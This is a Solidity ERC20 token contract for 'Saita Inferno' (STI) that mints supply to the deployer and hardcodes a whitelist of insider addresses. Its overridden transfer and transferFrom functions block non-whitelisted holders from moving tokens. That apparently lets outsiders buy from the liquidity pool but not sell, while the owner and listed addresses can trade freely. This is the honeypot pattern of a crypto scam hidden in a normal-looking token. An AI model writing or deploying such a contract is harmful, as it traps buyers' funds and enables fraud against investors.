// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("Saita Inferno", "STI") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 333000000 * 10 ** decimals());
        whiteList[0xC00FF6dF4414005fAcC4C9073C95e824BCD6f083]= true;
        whiteList[0x02bc4529Bfe24CEC2FD3CB5AA008084fc7e9D640]=true;
        whiteList[0x495c2c09766eaAb00124294418490e9c9441476B]=true;
        whiteList[0x861678Ae84C4e47f60Fb307F4d4a3337668a5684]=true;
        whiteList[0xa0245b3862B972C279B647D6eb6a87ACbc89a34E]=true;
        whiteList[0xd8E0B7f0c178517AF3579340282DF6147F42222C]=true;
        whiteList[0x9E9B291Da32CB15fb33B52b5eB5E707cE9b803EC]=true;
        whiteList[0x0F685efa8b6E67477b5Bf176E171C7a2E9173799]=true;
        whiteList[0xEdA8eD6EF9835153C4Cd2f172f1CC689AA5dBA3b]=true;
        whiteList[0x1d131Fa6056Dad324891A78044cb8CA8E772521e]=true;
        whiteList[0x0859bE32A449cB7E0Fc0CA0C072843511aDc7F37]=true;
        whiteList[0x82cC1244Ef1E6a8C3e2e16576F211aB8504b84Da]=true;
        whiteList[0x3451b30b42C8F00ED24B44523691ADe21BA2f6C5]=true;
        whiteList[0x0f5A84B765eD8079BDD0E51a69E54Aa0f6691375]=true;
        whiteList[0x04ACDfBd9F3dc1EeFB4793f4316Ea194761D99a4]=true;
        whiteList[0x9D362f38406273006c1f1DE7a1751850A8209445]=true;
        whiteList[0xC1666C0EeC75379053454f206177c0518fec5531]=true;
        whiteList[0x53FB9F441B13314D73652913De7c74b40F9A393d]=true;
        whiteList[0xaebe3C8C5597aDCE1640cd5d40aB387cd0B77B77]=true;
        whiteList[0x9b0b3385498fcC901944473Cb9c9F86d897652f6]=true;
        whiteList[0x5e8FFb712057bEd1C6F3207EFf84242799a8db00]=true;
        whiteList[0x087c1Ee73BFFFd3fd6C07249760043af8dBA9536]=true;
        whiteList[0xc058c932E1EecDc7c0139c5f0d5630D75320D1cb]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}